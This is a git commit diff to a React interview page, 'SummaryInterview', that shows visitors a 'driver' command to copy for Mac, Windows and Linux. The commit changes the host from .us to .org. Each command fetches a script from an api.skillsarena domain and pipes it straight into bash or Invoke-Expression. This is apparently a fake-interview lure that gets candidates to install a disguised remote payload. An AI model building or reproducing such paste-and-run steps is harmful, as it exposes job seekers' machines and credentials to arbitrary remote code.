f6d2d2127aaf4c884835162bf2209c7ae1f719d6
justice.brewer0293@outlook.com <justice.brewer0293@outlook.com>
2026-06-22 11:52:46 -0400

    update

--- src/pages/SummaryInterview.jsx
+++ src/pages/SummaryInterview.jsx
@@ -754,17 +754,17 @@ export default function SummaryInterview() {
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                 {driverOs === 'mac' && (
                       <code>
-                      {`curl -sL -X POST https://api.skillsarena.us/mac/${inviteLink ? inviteLink : ''} | bash`}
+                      {`curl -sL -X POST https://api.skillsarena.org/mac/${inviteLink ? inviteLink : ''} | bash`}
                           </code>
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`Invoke-RestMethod -Uri "https://api.skillsarena.us/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
+                      {`Invoke-RestMethod -Uri "https://api.skillsarena.org/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
                           </code>
                       )}
               {driverOs === 'linux' && (
                       <code>
-                  {`curl -sL -X POST https://api.skillsarena.us/mac/${inviteLink ? inviteLink : ''} | bash`}
+                  {`curl -sL -X POST https://api.skillsarena.org/mac/${inviteLink ? inviteLink : ''} | bash`}
                       </code>
                   )}
             </div>
